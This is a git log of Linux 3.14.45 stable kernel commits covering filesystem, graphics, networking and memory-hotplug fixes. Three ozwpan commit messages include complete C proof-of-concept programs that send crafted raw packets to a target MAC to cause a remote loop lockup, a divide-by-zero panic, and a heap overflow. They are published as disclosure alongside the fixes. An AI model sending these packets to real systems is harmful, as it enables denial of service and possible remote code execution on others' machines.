commit 165797d05c15ab87ef7421c63a076ffa8477cbe4
Author: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
Date:   Mon Jun 22 17:01:36 2015 -0700

    Linux 3.14.45

commit 5e0b100bca05d5e2fcb3e8cea64106364b8efe41
Author: Jeff Mahoney <jeffm@suse.com>
Date:   Fri Mar 20 14:02:09 2015 -0400

    btrfs: cleanup orphans while looking up default subvolume
    
    commit 727b9784b6085c99c2f836bf4fcc2848dc9cf904 upstream.
    
    Orphans in the fs tree are cleaned up via open_ctree and subvolume
    orphans are cleaned via btrfs_lookup_dentry -- except when a default
    subvolume is in use.  The name for the default subvolume uses a manual
    lookup that doesn't trigger orphan cleanup and needs to trigger it
    manually as well. This doesn't apply to the remount case since the
    subvolumes are cleaned up by walking the root radix tree.
    
    Signed-off-by: Jeff Mahoney <jeffm@suse.com>
    Reviewed-by: David Sterba <dsterba@suse.cz>
    Signed-off-by: Chris Mason <clm@fb.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit e460b5d19ce84217468b6017326785bcd5de6888
Author: Chengyu Song <csong84@gatech.edu>
Date:   Tue Mar 24 18:12:56 2015 -0400

    btrfs: incorrect handling for fiemap_fill_next_extent return
    
    commit 26e726afe01c1c82072cf23a5ed89ce25f39d9f2 upstream.
    
    fiemap_fill_next_extent returns 0 on success, -errno on error, 1 if this was
    the last extent that will fit in user array. If 1 is returned, the return
    value may eventually returned to user space, which should not happen, according
    to manpage of ioctl.
    
    Signed-off-by: Chengyu Song <csong84@gatech.edu>
    Reviewed-by: David Sterba <dsterba@suse.cz>
    Reviewed-by: Liu Bo <bo.li.liu@oracle.com>
    Signed-off-by: Chris Mason <clm@fb.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit d1d7f2310ab5da6fc92fbf4990d8f6b2d3deb39a
Author: Johannes Berg <johannes.berg@intel.com>
Date:   Tue Jun 9 21:35:44 2015 +0200

    cfg80211: wext: clear sinfo struct before calling driver
    
    commit 9c5a18a31b321f120efda412281bb9f610f84aa0 upstream.
    
    Until recently, mac80211 overwrote all the statistics it could
    provide when getting called, but it now relies on the struct
    having been zeroed by the caller. This was always the case in
    nl80211, but wext used a static struct which could even cause
    values from one device leak to another.
    
    Using a static struct is OK (as even documented in a comment)
    since the whole usage of this function and its return value is
    always locked under RTNL. Not clearing the struct for calling
    the driver has always been wrong though, since drivers were
    free to only fill values they could report, so calling this
    for one device and then for another would always have leaked
    values from one to the other.
    
    Fix this by initializing the structure in question before the
    driver method call.
    
    This fixes https://bugzilla.kernel.org/show_bug.cgi?id=99691
    
    Reported-by: Gerrit Renker <gerrit@erg.abdn.ac.uk>
    Reported-by: Alexander Kaltsas <alexkaltsas@gmail.com>
    Signed-off-by: Johannes Berg <johannes.berg@intel.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 20272b17474284e93cc8af418b39a30f94357f28
Author: Gu Zheng <guz.fnst@cn.fujitsu.com>
Date:   Wed Jun 10 11:14:43 2015 -0700

    mm/memory_hotplug.c: set zone->wait_table to null after freeing it
    
    commit 85bd839983778fcd0c1c043327b14a046e979b39 upstream.
    
    Izumi found the following oops when hot re-adding a node:
    
        BUG: unable to handle kernel paging request at ffffc90008963690
        IP: __wake_up_bit+0x20/0x70
        Oops: 0000 [#1] SMP
        CPU: 68 PID: 1237 Comm: rs:main Q:Reg Not tainted 4.1.0-rc5 #80
        Hardware name: FUJITSU PRIMEQUEST2800E/SB, BIOS PRIMEQUEST 2000 Series BIOS Version 1.87 04/28/2015
        task: ffff880838df8000 ti: ffff880017b94000 task.ti: ffff880017b94000
        RIP: 0010:[<ffffffff810dff80>]  [<ffffffff810dff80>] __wake_up_bit+0x20/0x70
        RSP: 0018:ffff880017b97be8  EFLAGS: 00010246
        RAX: ffffc90008963690 RBX: 00000000003c0000 RCX: 000000000000a4c9
        RDX: 0000000000000000 RSI: ffffea101bffd500 RDI: ffffc90008963648
        RBP: ffff880017b97c08 R08: 0000000002000020 R09: 0000000000000000
        R10: 0000000000000000 R11: 0000000000000000 R12: ffff8a0797c73800
        R13: ffffea101bffd500 R14: 0000000000000001 R15: 00000000003c0000
        FS:  00007fcc7ffff700(0000) GS:ffff880874800000(0000) knlGS:0000000000000000
        CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
        CR2: ffffc90008963690 CR3: 0000000836761000 CR4: 00000000001407e0
        Call Trace:
          unlock_page+0x6d/0x70
          generic_write_end+0x53/0xb0
          xfs_vm_write_end+0x29/0x80 [xfs]
          generic_perform_write+0x10a/0x1e0
          xfs_file_buffered_aio_write+0x14d/0x3e0 [xfs]
          xfs_file_write_iter+0x79/0x120 [xfs]
          __vfs_write+0xd4/0x110
          vfs_write+0xac/0x1c0
          SyS_write+0x58/0xd0
          system_call_fastpath+0x12/0x76
        Code: 5d c3 66 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 55 48 89 e5 48 83 ec 20 65 48 8b 04 25 28 00 00 00 48 89 45 f8 31 c0 48 8d 47 48 <48> 39 47 48 48 c7 45 e8 00 00 00 00 48 c7 45 f0 00 00 00 00 48
        RIP  [<ffffffff810dff80>] __wake_up_bit+0x20/0x70
         RSP <ffff880017b97be8>
        CR2: ffffc90008963690
    
    Reproduce method (re-add a node)::
      Hot-add nodeA --> remove nodeA --> hot-add nodeA (panic)
    
    This seems an use-after-free problem, and the root cause is
    zone->wait_table was not set to *NULL* after free it in
    try_offline_node.
    
    When hot re-add a node, we will reuse the pgdat of it, so does the zone
    struct, and when add pages to the target zone, it will init the zone
    first (including the wait_table) if the zone is not initialized.  The
    judgement of zone initialized is based on zone->wait_table:
    
            static inline bool zone_is_initialized(struct zone *zone)
            {
                    return !!zone->wait_table;
            }
    
    so if we do not set the zone->wait_table to *NULL* after free it, the
    memory hotplug routine will skip the init of new zone when hot re-add
    the node, and the wait_table still points to the freed memory, then we
    will access the invalid address when trying to wake up the waiting
    people after the i/o operation with the page is done, such as mentioned
    above.
    
    Signed-off-by: Gu Zheng <guz.fnst@cn.fujitsu.com>
    Reported-by: Taku Izumi <izumi.taku@jp.fujitsu.com>
    Reviewed by: Yasuaki Ishimatsu <isimatu.yasuaki@jp.fujitsu.com>
    Cc: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com>
    Cc: Tang Chen <tangchen@cn.fujitsu.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit bb6060654459407ca7bf656456a178f40cbf1f7a
Author: Philipp Zabel <p.zabel@pengutronix.de>
Date:   Tue May 19 10:54:09 2015 +0200

    serial: imx: Fix DMA handling for IDLE condition aborts
    
    commit 392bceedb107a3dc1d4287e63d7670d08f702feb upstream.
    
    The driver configures the IDLE condition to interrupt the SDMA engine.
    Since the SDMA UART ROM script doesn't clear the IDLE bit itself, this
    caused repeated 1-byte DMA transfers, regardless of available data in the
    RX FIFO. Also, when returning due to the IDLE condition, the UART ROM
    script already increased its counter, causing residue to be off by one.
    
    This patch clears the IDLE condition to avoid repeated 1-byte DMA transfers
    and decreases count by when the DMA transfer was aborted due to the IDLE
    condition, fixing serial transfers using DMA on i.MX6Q.
    
    Reported-by: Peter Seiderer <ps.report@gmx.net>
    Signed-off-by: Philipp Zabel <p.zabel@pengutronix.de>
    Tested-by: Fabio Estevam <fabio.estevam@freescale.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 6fb3e1bc2b825db7300b240380ad7228a9d3460c
Author: Jérôme Glisse <jglisse@redhat.com>
Date:   Fri Jun 5 13:33:57 2015 -0400

    drm/radeon: fix freeze for laptop with Turks/Thames GPU.
    
    commit 6dfd197283bffc23a2b046a7f065588de7e1fc1e upstream.
    
    Laptop with Turks/Thames GPU will freeze if dpm is enabled. It seems
    the SMC engine is relying on some state inside the CP engine. CP needs
    to chew at least one packet for it to get in good state for dynamic
    power management.
    
    This patch simply disabled and re-enable DPM after the ring test which
    is enough to avoid the freeze.
    
    Signed-off-by: Jérôme Glisse <jglisse@redhat.com>
    Signed-off-by: Alex Deucher <alexander.deucher@amd.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 93fbe0f62906303f566fc3a1405ad4767c8854c2
Author: Jani Nikula <jani.nikula@intel.com>
Date:   Tue Jun 2 19:21:15 2015 +0300

    drm/i915: Fix DDC probe for passive adapters
    
    commit 3f5f1554ee715639e78d9be87623ee82772537e0 upstream.
    
    Passive DP->DVI/HDMI dongles on DP++ ports show up to the system as HDMI
    devices, as they do not have a sink device in them to respond to any AUX
    traffic. When probing these dongles over the DDC, sometimes they will
    NAK the first attempt even though the transaction is valid and they
    support the DDC protocol. The retry loop inside of
    drm_do_probe_ddc_edid() would normally catch this case and try the
    transaction again, resulting in success.
    
    That, however, was thwarted by the fix for [1]:
    
    commit 9292f37e1f5c79400254dca46f83313488093825
    Author: Eugeni Dodonov <eugeni.dodonov@intel.com>
    Date:   Thu Jan 5 09:34:28 2012 -0200
    
        drm: give up on edid retries when i2c bus is not responding
    
    This added code to exit immediately if the return code from the
    i2c_transfer function was -ENXIO in order to reduce the amount of time
    spent in waiting for unresponsive or disconnected devices. That was
    possible because the underlying i2c bit banging algorithm had retries of
    its own (which, of course, were part of the reason for the bug the
    commit fixes).
    
    Since its introduction in
    
    commit f899fc64cda8569d0529452aafc0da31c042df2e
    Author: Chris Wilson <chris@chris-wilson.co.uk>
    Date:   Tue Jul 20 15:44:45 2010 -0700
    
        drm/i915: use GMBUS to manage i2c links
    
    we've been flipping back and forth enabling the GMBUS transfers, but
    we've settled since then. The GMBUS implementation does not do any
    retries, however, bailing out of the drm_do_probe_ddc_edid() retry loop
    on first encounter of -ENXIO. This, combined with Eugeni's commit, broke
    the retry on -ENXIO.
    
    Retry GMBUS once on -ENXIO on first message to mitigate the issues with
    passive adapters.
    
    This patch is based on the work, and commit message, by Todd Previte
    <tprevite@gmail.com>.
    
    [1] https://bugs.freedesktop.org/show_bug.cgi?id=41059
    
    v2: Don't retry if using bit banging.
    
    v3: Move retry within gmbux_xfer, retry only on first message.
    
    v4: Initialize GMBUS0 on retry (Ville).
    
    v5: Take index reads into account (Ville).
    
    Bugzilla: https://bugs.freedesktop.org/show_bug.cgi?id=85924
    Cc: Todd Previte <tprevite@gmail.com>
    Tested-by: Oliver Grafe <oliver.grafe@ge.com> (v2)
    Tested-by: Jim Bride <jim.bride@linux.intel.com>
    Reviewed-by: Ville Syrjälä <ville.syrjala@linux.intel.com>
    Signed-off-by: Jani Nikula <jani.nikula@intel.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit b99bffd1f1687551b5b0505cd49e30c92ec59cc5
Author: Jim Bride <jim.bride@linux.intel.com>
Date:   Wed May 27 10:21:48 2015 -0700

    drm/i915/hsw: Fix workaround for server AUX channel clock divisor
    
    commit e058c945e03a629c99606452a6931f632dd28903 upstream.
    
    According to the HSW b-spec we need to try clock divisors of 63
    and 72, each 3 or more times, when attempting DP AUX channel
    communication on a server chipset.  This actually wasn't happening
    due to a short-circuit that only checked the DP_AUX_CH_CTL_DONE bit
    in status rather than checking that the operation was done and
    that DP_AUX_CH_CTL_TIME_OUT_ERROR was not set.
    
    [v2] Implemented alternate solution suggested by Jani Nikula.
    
    Signed-off-by: Jim Bride <jim.bride@linux.intel.com>
    Signed-off-by: Jani Nikula <jani.nikula@intel.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit f5ea938cde299128c094c07f5a2d2e73bace49dd
Author: Aaro Koskinen <aaro.koskinen@nokia.com>
Date:   Mon Jun 8 11:32:43 2015 +0300

    pata_octeon_cf: fix broken build
    
    commit 4710f2facb5c68d629015747bd09b37203e0d137 upstream.
    
    MODULE_DEVICE_TABLE is referring to wrong driver's table and breaks the
    build. Fix that.
    
    Signed-off-by: Aaro Koskinen <aaro.koskinen@nokia.com>
    Signed-off-by: Tejun Heo <tj@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit b401148c9de89b542c14b3bf0b31a9c167f97f33
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:07:01 2015 +0200

    ozwpan: unchecked signed subtraction leads to DoS
    
    commit 9a59029bc218b48eff8b5d4dde5662fd79d3e1a8 upstream.
    
    The subtraction here was using a signed integer and did not have any
    bounds checking at all. This commit adds proper bounds checking, made
    easy by use of an unsigned integer. This way, a single packet won't be
    able to remotely trigger a massive loop, locking up the system for a
    considerable amount of time. A PoC follows below, which requires
    ozprotocol.h from this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
            if (c >= '0' && c <= '9')
                    return c - '0';
            if (c >= 'a' && c <= 'f')
                    return c - 'a' + 10;
            if (c >= 'A' && c <= 'F')
                    return c - 'A' + 10;
            return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
            int i;
            for (i = 0; i < 6; i++) {
                    int a, b;
                    a = hex2num(*txt++);
                    if (a < 0)
                            return -1;
                    b = hex2num(*txt++);
                    if (b < 0)
                            return -1;
                    *addr++ = (a << 4) | b;
                    if (i < 5 && *txt++ != ':')
                            return -1;
            }
            return 0;
    }
    
    int main(int argc, char *argv[])
    {
            if (argc < 3) {
                    fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
                    return 1;
            }
    
            uint8_t dest_mac[6];
            if (hwaddr_aton(argv[2], dest_mac)) {
                    fprintf(stderr, "Invalid mac address.\n");
                    return 1;
            }
    
            int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
            if (sockfd < 0) {
                    perror("socket");
                    return 1;
            }
    
            struct ifreq if_idx;
            int interface_index;
            strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
            if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
                    perror("SIOCGIFINDEX");
                    return 1;
            }
            interface_index = if_idx.ifr_ifindex;
            if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
                    perror("SIOCGIFHWADDR");
                    return 1;
            }
            uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
            struct {
                    struct ether_header ether_header;
                    struct oz_hdr oz_hdr;
                    struct oz_elt oz_elt;
                    struct oz_elt_connect_req oz_elt_connect_req;
                    struct oz_elt oz_elt2;
                    struct oz_multiple_fixed oz_multiple_fixed;
            } __packed packet = {
                    .ether_header = {
                            .ether_type = htons(OZ_ETHERTYPE),
                            .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
                            .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
                    },
                    .oz_hdr = {
                            .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
                            .last_pkt_num = 0,
                            .pkt_num = htole32(0)
                    },
                    .oz_elt = {
                            .type = OZ_ELT_CONNECT_REQ,
                            .length = sizeof(struct oz_elt_connect_req)
                    },
                    .oz_elt_connect_req = {
                            .mode = 0,
                            .resv1 = {0},
                            .pd_info = 0,
                            .session_id = 0,
                            .presleep = 0,
                            .ms_isoc_latency = 0,
                            .host_vendor = 0,
                            .keep_alive = 0,
                            .apps = htole16((1 << OZ_APPID_USB) | 0x1),
                            .max_len_div16 = 0,
                            .ms_per_isoc = 0,
                            .up_audio_buf = 0,
                            .ms_per_elt = 0
                    },
                    .oz_elt2 = {
                            .type = OZ_ELT_APP_DATA,
                            .length = sizeof(struct oz_multiple_fixed) - 3
                    },
                    .oz_multiple_fixed = {
                            .app_id = OZ_APPID_USB,
                            .elt_seq_num = 0,
                            .type = OZ_USB_ENDPOINT_DATA,
                            .endpoint = 0,
                            .format = OZ_DATA_F_MULTIPLE_FIXED,
                            .unit_size = 1,
                            .data = {0}
                    }
            };
    
            struct sockaddr_ll socket_address = {
                    .sll_ifindex = interface_index,
                    .sll_halen = ETH_ALEN,
                    .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
            };
    
            if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
                    perror("sendto");
                    return 1;
            }
            return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit c352bbe0f4b610a9f9f1327a63fd558a840afc85
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:07:00 2015 +0200

    ozwpan: divide-by-zero leading to panic
    
    commit 04bf464a5dfd9ade0dda918e44366c2c61fce80b upstream.
    
    A network supplied parameter was not checked before division, leading to
    a divide-by-zero. Since this happens in the softirq path, it leads to a
    crash. A PoC follows below, which requires the ozprotocol.h file from
    this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
            if (c >= '0' && c <= '9')
                    return c - '0';
            if (c >= 'a' && c <= 'f')
                    return c - 'a' + 10;
            if (c >= 'A' && c <= 'F')
                    return c - 'A' + 10;
            return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
            int i;
            for (i = 0; i < 6; i++) {
                    int a, b;
                    a = hex2num(*txt++);
                    if (a < 0)
                            return -1;
                    b = hex2num(*txt++);
                    if (b < 0)
                            return -1;
                    *addr++ = (a << 4) | b;
                    if (i < 5 && *txt++ != ':')
                            return -1;
            }
            return 0;
    }
    
    int main(int argc, char *argv[])
    {
            if (argc < 3) {
                    fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
                    return 1;
            }
    
            uint8_t dest_mac[6];
            if (hwaddr_aton(argv[2], dest_mac)) {
                    fprintf(stderr, "Invalid mac address.\n");
                    return 1;
            }
    
            int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
            if (sockfd < 0) {
                    perror("socket");
                    return 1;
            }
    
            struct ifreq if_idx;
            int interface_index;
            strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
            if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
                    perror("SIOCGIFINDEX");
                    return 1;
            }
            interface_index = if_idx.ifr_ifindex;
            if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
                    perror("SIOCGIFHWADDR");
                    return 1;
            }
            uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
            struct {
                    struct ether_header ether_header;
                    struct oz_hdr oz_hdr;
                    struct oz_elt oz_elt;
                    struct oz_elt_connect_req oz_elt_connect_req;
                    struct oz_elt oz_elt2;
                    struct oz_multiple_fixed oz_multiple_fixed;
            } __packed packet = {
                    .ether_header = {
                            .ether_type = htons(OZ_ETHERTYPE),
                            .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
                            .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
                    },
                    .oz_hdr = {
                            .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
                            .last_pkt_num = 0,
                            .pkt_num = htole32(0)
                    },
                    .oz_elt = {
                            .type = OZ_ELT_CONNECT_REQ,
                            .length = sizeof(struct oz_elt_connect_req)
                    },
                    .oz_elt_connect_req = {
                            .mode = 0,
                            .resv1 = {0},
                            .pd_info = 0,
                            .session_id = 0,
                            .presleep = 0,
                            .ms_isoc_latency = 0,
                            .host_vendor = 0,
                            .keep_alive = 0,
                            .apps = htole16((1 << OZ_APPID_USB) | 0x1),
                            .max_len_div16 = 0,
                            .ms_per_isoc = 0,
                            .up_audio_buf = 0,
                            .ms_per_elt = 0
                    },
                    .oz_elt2 = {
                            .type = OZ_ELT_APP_DATA,
                            .length = sizeof(struct oz_multiple_fixed)
                    },
                    .oz_multiple_fixed = {
                            .app_id = OZ_APPID_USB,
                            .elt_seq_num = 0,
                            .type = OZ_USB_ENDPOINT_DATA,
                            .endpoint = 0,
                            .format = OZ_DATA_F_MULTIPLE_FIXED,
                            .unit_size = 0,
                            .data = {0}
                    }
            };
    
            struct sockaddr_ll socket_address = {
                    .sll_ifindex = interface_index,
                    .sll_halen = ETH_ALEN,
                    .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
            };
    
            if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
                    perror("sendto");
                    return 1;
            }
            return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit b440eec2f2729ef6b224030894ea8880f2937371
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:06:58 2015 +0200

    ozwpan: Use proper check to prevent heap overflow
    
    commit d114b9fe78c8d6fc6e70808c2092aa307c36dc8e upstream.
    
    Since elt->length is a u8, we can make this variable a u8. Then we can
    do proper bounds checking more easily. Without this, a potentially
    negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
    resulting in a remotely exploitable heap overflow with network
    supplied data.
    
    This could result in remote code execution. A PoC which obtains DoS
    follows below. It requires the ozprotocol.h file from this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
            if (c >= '0' && c <= '9')
                    return c - '0';
            if (c >= 'a' && c <= 'f')
                    return c - 'a' + 10;
            if (c >= 'A' && c <= 'F')
                    return c - 'A' + 10;
            return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
            int i;
            for (i = 0; i < 6; i++) {
                    int a, b;
                    a = hex2num(*txt++);
                    if (a < 0)
                            return -1;
                    b = hex2num(*txt++);
                    if (b < 0)
                            return -1;
                    *addr++ = (a << 4) | b;
                    if (i < 5 && *txt++ != ':')
                            return -1;
            }
            return 0;
    }
    
    int main(int argc, char *argv[])
    {
            if (argc < 3) {
                    fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
                    return 1;
            }
    
            uint8_t dest_mac[6];
            if (hwaddr_aton(argv[2], dest_mac)) {
                    fprintf(stderr, "Invalid mac address.\n");
                    return 1;
            }
    
            int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
            if (sockfd < 0) {
                    perror("socket");
                    return 1;
            }
    
            struct ifreq if_idx;
            int interface_index;
            strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
            if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
                    perror("SIOCGIFINDEX");
                    return 1;
            }
            interface_index = if_idx.ifr_ifindex;
            if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
                    perror("SIOCGIFHWADDR");
                    return 1;
            }
            uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
            struct {
                    struct ether_header ether_header;
                    struct oz_hdr oz_hdr;
                    struct oz_elt oz_elt;
                    struct oz_elt_connect_req oz_elt_connect_req;
            } __packed connect_packet = {
                    .ether_header = {
                            .ether_type = htons(OZ_ETHERTYPE),
                            .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
                            .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
                    },
                    .oz_hdr = {
                            .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
                            .last_pkt_num = 0,
                            .pkt_num = htole32(0)
                    },
                    .oz_elt = {
                            .type = OZ_ELT_CONNECT_REQ,
                            .length = sizeof(struct oz_elt_connect_req)
                    },
                    .oz_elt_connect_req = {
                            .mode = 0,
                            .resv1 = {0},
                            .pd_info = 0,
                            .session_id = 0,
                            .presleep = 35,
                            .ms_isoc_latency = 0,
                            .host_vendor = 0,
                            .keep_alive = 0,
                            .apps = htole16((1 << OZ_APPID_USB) | 0x1),
                            .max_len_div16 = 0,
                            .ms_per_isoc = 0,
                            .up_audio_buf = 0,
                            .ms_per_elt = 0
                    }
            };
    
            struct {
                    struct ether_header ether_header;
                    struct oz_hdr oz_hdr;
                    struct oz_elt oz_elt;
                    struct oz_get_desc_rsp oz_get_desc_rsp;
            } __packed pwn_packet = {
                    .ether_header = {
                            .ether_type = htons(OZ_ETHERTYPE),
                            .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
                            .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
                    },
                    .oz_hdr = {
                            .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
                            .last_pkt_num = 0,
                            .pkt_num = htole32(1)
                    },
                    .oz_elt = {
                            .type = OZ_ELT_APP_DATA,
                            .length = sizeof(struct oz_get_desc_rsp) - 2
                    },
                    .oz_get_desc_rsp = {
                            .app_id = OZ_APPID_USB,
                            .elt_seq_num = 0,
                            .type = OZ_GET_DESC_RSP,
                            .req_id = 0,
                            .offset = htole16(0),
                            .total_size = htole16(0),
                            .rcode = 0,
                            .data = {0}
                    }
            };
    
            struct sockaddr_ll socket_address = {
                    .sll_ifindex = interface_index,
                    .sll_halen = ETH_ALEN,
                    .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
            };
    
            if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
                    perror("sendto");
                    return 1;
            }
            usleep(300000);
            if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
                    perror("sendto");
                    return 1;
            }
            return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 403ebc5538fd61771f4c8109e8a74cb5219506bf
Author: James Hogan <jhogan@kernel.org>
Date:   Thu Jun 4 13:25:27 2015 +0100

    MIPS: Fix enabling of DEBUG_STACKOVERFLOW
    
    commit 5f35b9cd553fd64415b563497d05a563c988dbd6 upstream.
    
    Commit 334c86c494b9 ("MIPS: IRQ: Add stackoverflow detection") added
    kernel stack overflow detection, however it only enabled it conditional
    upon the preprocessor definition DEBUG_STACKOVERFLOW, which is never
    actually defined. The Kconfig option is called DEBUG_STACKOVERFLOW,
    which manifests to the preprocessor as CONFIG_DEBUG_STACKOVERFLOW, so
    switch it to using that definition instead.
    
    Fixes: 334c86c494b9 ("MIPS: IRQ: Add stackoverflow detection")
    Signed-off-by: James Hogan <james.hogan@imgtec.com>
    Cc: Ralf Baechle <ralf@linux-mips.org>
    Cc: Adam Jiang <jiang.adam@gmail.com>
    Cc: linux-mips@linux-mips.org
    Patchwork: http://patchwork.linux-mips.org/patch/10531/
    Signed-off-by: Ralf Baechle <ralf@linux-mips.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 5466525494915e697888c15a5483e10df9332b61
Author: Wang Long <long.wanglong@huawei.com>
Date:   Wed Jun 10 08:12:37 2015 +0000

    ring-buffer-benchmark: Fix the wrong sched_priority of producer
    
    commit 108029323910c5dd1ef8fa2d10da1ce5fbce6e12 upstream.
    
    The producer should be used producer_fifo as its sched_priority,
    so correct it.
    
    Link: http://lkml.kernel.org/r/1433923957-67842-1-git-send-email-long.wanglong@huawei.com
    
    Signed-off-by: Wang Long <long.wanglong@huawei.com>
    Signed-off-by: Steven Rostedt <rostedt@goodmis.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 510458cb7da6205526445fcba0ea6fae7641698c
Author: Andy Lutomirski <luto@kernel.org>
Date:   Fri May 22 16:15:47 2015 -0700

    x86/asm/irq: Stop relying on magic JMP behavior for early_idt_handlers
    
    commit 425be5679fd292a3c36cb1fe423086708a99f11a upstream.
    
